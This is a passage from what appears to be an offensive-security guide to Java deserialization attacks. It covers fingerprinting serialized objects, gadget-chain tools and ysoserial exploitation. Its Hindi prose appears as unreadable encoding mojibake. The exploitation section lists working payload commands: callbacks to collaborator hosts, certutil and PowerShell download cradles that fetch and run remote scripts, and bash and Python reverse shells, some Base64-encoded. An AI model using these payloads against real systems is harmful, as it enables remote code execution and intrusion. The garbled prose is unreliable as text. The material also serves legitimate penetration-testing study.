**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ рд╕реНрд░реЛрдд рдХреЛ рдкрдврд╝реЗрдВ**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo рдкреБрд╕реНрддрдХрд╛рд▓рдп

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрдареЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рдЗрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реЗрдЧреА рдЬрд┐рд╕рд╕реЗ рд╡рд┐рдЪрд╛рд░рд╣реАрди рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Java рдореЗрдВ, **рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдХреЙрд▓рдмреИрдХ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ**ред рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╢рд┐рдХрд╛рд░ рдмрди рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рджреБрд░реБрдкрдпреЛрдЧреА рдкреЗрд▓реЛрдб рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдЗрди рдХреЙрд▓рдмреИрдХ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

### Fingerprints

#### White Box

рдХреЛрдбрдмреЗрд╕ рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬреЗрд╢рди рд╡рдВрд░рдмрд┐рд▓рд┐рдЯреАрдЬ рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХрд░реЗрдВ:

* рд╡рд░реНрдЧ рдЬреЛ `Serializable` рдЗрдВрдЯрд░рдлреЗрд╕ рдХрд╛ рдЕрдорд▓ рдХрд░рддреЗ рд╣реИрдВред
* `java.io.ObjectInputStream`, `readObject`, `readUnshare` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧред

рд╡рд┐рд╢реЗрд╖ рдзреНрдпрд╛рди рджреЗрдВ:

* рдмрд╛рд╣реНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ `XMLDecoder`ред
* `XStream` рдХрд╛ `fromXML` рд╡рд┐рдзрд┐, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдпрджрд┐ XStream рд╕рдВрд╕реНрдХрд░рдг 1.46 рд╕реЗ рдХрдо рдпрд╛ рдмрд░рд╛рдмрд░ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬреЗрд╢рди рд╕рдорд╕реНрдпрд╛рдПрдБ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред
* `ObjectInputStream` рдЬреЛ `readObject` рд╡рд┐рдзрд┐ рдХреЗ рд╕рд╛рде рд╣реИред
* `readObject`, `readObjectNodData`, `readResolve`, рдпрд╛ `readExternal` рдЬреИрд╕реА рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрдиред
* `ObjectInputStream.readUnshared`ред
* `Serializable` рдХрд╛ рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧред

#### Black Box

рдХрд╛рд▓реЗ рдмреЙрдХреНрд╕ рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП, рд╡рд┐рд╢реЗрд╖ **рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдпрд╛ "рдореИрдЬрд┐рдХ рдмрд╛рдЗрдЯреНрд╕"** рдЦреЛрдЬреЗрдВ рдЬреЛ рдЬрд╛рд╡рд╛ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬреНрдб рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рджрд░реНрд╢рд╛рддреЗ рд╣реИрдВ (`ObjectInputStream` рд╕реЗ рдЙрддреНрдкрдиреНрди):

* рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рдкреИрдЯрд░реНрди: `AC ED 00 05`ред
* рдмреЗрд╕64 рдкреИрдЯрд░реНрди: `rO0`ред
* HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░ рдЬрд┐рд╕рдореЗрдВ `Content-type` рдХреЛ `application/x-java-serialized-object` рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* рдкреВрд░реНрд╡ рд╕рдВрдХреБрдЪрди рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рдкреИрдЯрд░реНрди: `1F 8B 08 00`ред
* рдкреВрд░реНрд╡ рд╕рдВрдХреБрдЪрди рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рд╡рд╛рд▓рд╛ рдмреЗрд╕64 рдкреИрдЯрд░реНрди: `H4sIA`ред
* `.faces` рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдФрд░ `faces.ViewState` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рд╡реЗрдм рдлрд╝рд╛рдЗрд▓реЗрдВред рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдЗрди рдкреИрдЯрд░реНрди рдХреА рдЦреЛрдЬ рдХреЛ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЬрд╛рдВрдЪ рдХреЛ рдкреНрд░реЗрд░рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреИрд╕рд╛ рдХрд┐ [Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md) рдХреЗ рдкреЛрд╕реНрдЯ рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд╡рд░реНрдгрд┐рдд рд╣реИред
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### рдпрджрд┐ рдЖрдк рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдЬрд╛рд╡рд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝рдб рдЕрднрд┐рдпрд╛рдВрддреНрд░рд┐рдХреА рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддреА рд╣реИ, рддреЛ рдЖрдкрдХреЛ [**рдмреЗрд╕рд┐рдХ рдЬрд╛рд╡рд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди**](basic-java-deserialization-objectinputstream-readobject.md), [**рдЬрд╛рд╡рд╛ DNS рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди**](java-dns-deserialization-and-gadgetprobe.md), рдФрд░ [**рдХреЙрдордиреНрд╕ рдХрд▓реЗрдХреНрд╢рди 1 рдкреЗрд▓реЛрдб**](java-transformers-to-rutime-exec-payload.md) рдкрд░ рдирдЬрд░ рдбрд╛рд▓рдиреА рдЪрд╛рд╣рд┐рдПред

#### рд╡реНрд╣рд╛рдЗрдЯ рдмреЙрдХреНрд╕ рдЯреЗрд╕реНрдЯ

рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдРрд╕рд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдкрддрд╛ рдЪрд▓реА рд╡реНрдпрд╡рд╕реНрдерд╛рдУрдВ рдХреА рдХреЛрдИ рд╕рдорд╕реНрдпрд╛ рд╣реИред
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
рдЖрдк **рд╕рднреА рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд╡рдВрд╢рд╡рд╛рджреА рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрд┐рдирдХреЗ рд▓рд┐рдП [**Ysoserial**](https://github.com/frohoff/ysoserial) рдПрдХ рдЙрддреНрдкреАрдбрд╝рди рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╛ рдЖрдк [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json) рдкрд░ рджрд┐рдЦрд╛рдП рдЧрдП рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрддреНрдкреАрдбрд╝рди рд╢реНрд░реГрдВрдЦрд▓рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЙрддреНрдкреАрдбрд╝рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред\
**gadgetinspector** рдХреЛ рдЪрд▓рд╛рддреЗ рд╕рдордп (рдЗрд╕реЗ рдмрд┐рд▓реНрдб рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж) рдЙрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЬрд╛ рд░рд╣реА рд╕рднреА рдЪреЗрддрд╛рд╡рдирд┐рдпреЛрдВ/рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреА рдЪрд┐рдВрддрд╛ рди рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рджреЗрдВред рдпрд╣ рд╕рднреА рдЦреЛрдЬреЛрдВ рдХреЛ _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ рдХреЗ рддрд╣рдд рд▓рд┐рдЦреЗрдЧрд╛ред рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **gadgetinspector рдПрдХ рдЙрддреНрдкреАрдбрд╝рди рдирд╣реАрдВ рдмрдирд╛рдПрдЧрд╛ рдФрд░ рдпрд╣ рдЧрд▓рдд рд╕рдХрд╛рд░рд╛рддреНрдордХ рдкрд░рд┐рдгрд╛рдо рджрд┐рдЦрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

#### рдХрд╛рд▓рд╛ рдмреЙрдХреНрд╕ рдкрд░реАрдХреНрд╖рдг

рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдХрд┐рд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ** (рдФрд░ рдХрд┐рд╕ рд╕рдВрд╕реНрдХрд░рдг) рдХреЛ рдкрд╣рдЪрд╛рди рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде, рдпрд╣ **рд╡рдВрд╢рд╡рд╛рдж рдХреЛ рдЙрддреНрдкреАрдбрд╝рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреЗрд▓реЛрдб рдЪреБрдирдирд╛ рд╕рд░рд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ**ред\
[**рдЗрд╕реЗ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП GadgetProbe рдкрдврд╝реЗрдВ**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**ред**\
GadgetProbe **`ObjectInputStream` рдЙрддреНрдкреАрдбрд╝рди** рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реИред

рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк ysoserial рдХреЗ рд╕рд╛рде рдЙрддреНрдкреАрдбрд╝рди рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА **рдкрд╣рдЪрд╛рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ **рдЙрддреНрдкреАрдбрд╝рд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[**рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ Java Deserialization Scanner рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдкрдврд╝реЗрдВ**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner **`ObjectInputStream`** рдЙрддреНрдкреАрдбрд╝рди рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реИред

рдЖрдк [**Freddy**](https://github.com/nccgroup/freddy) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдмрд░реНрдк** рдореЗрдВ рдЙрддреНрдкреАрдбрд╝рди рд╕рдВрдХрдЯреЛрдВ рдХреА **рдкрд╣рдЪрд╛рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдкреНрд▓рдЧрдЗрди **рдХреЗрд╡рд▓ `ObjectInputStream`** рд╕рдВрдмрдВрдзрд┐рдд рд╕рдВрдХрдЯреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдЧрд╛ рдмрд▓реНрдХрд┐ **Json** рдФрд░ **Yml** рдЙрддреНрдкреАрдбрд╝рди рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рд╕реЗ рднреА vulns рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдЧрд╛ред рд╕рдХреНрд░рд┐рдп рдореЛрдб рдореЗрдВ, рдпрд╣ рдЙрдиреНрд╣реЗрдВ рд╕реБрдиреА рдпрд╛ DNS рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ред\
[**рдЖрдк рдлреНрд░реЗрдбреА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**рд╕рдВрдЪрдпрди рдкрд░реАрдХреНрд╖рдг**

рд╕рднреА рдпрд╣ рдирд╣реАрдВ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдХреЛрдИ рднреА рд╡рдВрд╢рд╡рд╛рджреА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред рдХрднреА-рдХрднреА рдЖрдк рд╕рдВрдЪрд┐рдд рд╡рд╕реНрддреБ рдХреЗ рдЕрдВрджрд░ рдХреЗ рдбреЗрдЯрд╛ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреБрдЫ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдЫрд▓рдХрд░ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ (рд╢рд╛рдпрдж рдПрдХ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЕрдВрджрд░ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред\
рдЕрдЧрд░ рдЖрдкрдХреЛ рдПрдХ рдЬрд╛рд╡рд╛ рд╕рдВрдЪрд┐рдд рд╡рд╕реНрддреБ рдорд┐рд▓рддреА рд╣реИ рдЬреЛ рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рднреЗрдЬреА рдЬрд╛ рд░рд╣реА рд╣реИ, рддреЛ рдЖрдк [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рднреЗрдЬреЗ рдЬрд╛ рд░рд╣реЗ рд╕рдВрдЪрдпрди рд╡рд╕реНрддреБ рдХреЛ рдПрдХ рдЕрдзрд┐рдХ рдорд╛рдирд╡реАрдп рдкрдардиреАрдп рд╕реНрд╡рд░реВрдк рдореЗрдВ рдкреНрд░рд┐рдВрдЯ рдХрд░ рд╕рдХреЗрдВред рдЬрд╛рдирдирд╛ рдХрд┐ рдЖрдк рдХреМрди рд╕реЗ рдбреЗрдЯрд╛ рднреЗрдЬ рд░рд╣реЗ рд╣реИрдВ рдЙрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдФрд░ рдХреБрдЫ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдЫрд▓рдХрд░ рдирд┐рдХрд╛рд▓рдирд╛ рд╕рд░рд▓ рд╣реЛрдЧрд╛ред

### **рдЙрддреНрдкреАрдбрд╝рди**

#### **ysoserial**

рдЬрд╛рд╡рд╛ рд╡рдВрд╢рд╡рд╛рджреЛрдВ рдХрд╛ рдЙрддреНрдкреАрдбрд╝рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореБрдЦреНрдп рдЙрдкрдХрд░рдг [**ysoserial**](https://github.com/frohoff/ysoserial) рд╣реИ ([**рдпрд╣рд╛рдБ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar))ред рдЖрдк [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдЬрдЯрд┐рд▓ рдХрдорд╛рдВрдбреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рджреЗрдЧрд╛ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдкрд╛рдЗрдкреНрд╕ рдХреЗ рд╕рд╛рде)ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдЙрдкрдХрд░рдг **`ObjectInputStream`** рдХрд╛ рдЙрддреНрдкреАрдбрд╝рди рдХрд░рдиреЗ рдкрд░ **рдХреЗрдВрджреНрд░рд┐рдд** рд╣реИред\
рдореИрдВ **"URLDNS"** рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ **RCE** рдкреЗрд▓реЛрдб рд╕реЗ рдкрд╣рд▓реЗ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░реВрдВрдЧрд╛ рддрд╛рдХрд┐ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рд╕рдВрднрд╡ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдПред рдлрд┐рд░ рднреА, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╢рд╛рдпрдж "URLDNS" рдкреЗрд▓реЛрдб рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реЛ рд▓реЗрдХрд┐рди рдЕрдиреНрдп RCE рдкреЗрд▓реЛрдб рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реЛред
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
рдЬрдм **java.lang.Runtime.exec()** рдХреЗ рд▓рд┐рдП payload рдмрдирд╛рддреЗ рд╣реИрдВ рддреЛ рдЖрдк **рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг** рдЬреИрд╕реЗ ">" рдпрд╛ "|" рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдПрдХ рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░ рд╕рдХреЗрдВ, "$()" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХреЗрдВ рдпрд╛ рдпрд╣рд╛рдБ рддрдХ рдХрд┐ **рдХрдорд╛рдВрдб рдХреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЕрд░реНрдЧреНрдпреВрдореЗрдВрдЯреНрд╕** рдХреЗ рд╕рд╛рде рдЕрд▓рдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЕрдВрддрд░рд┐рдХреНрд╖** рд╕реЗ рдЕрд▓рдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЖрдк `echo -n "hello world"` рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдк `python2 -c 'print "Hello world"'` рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред Payload рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдПрдиреНрдХреЛрдб рдХрд░рдиреЗ рдХреЗ 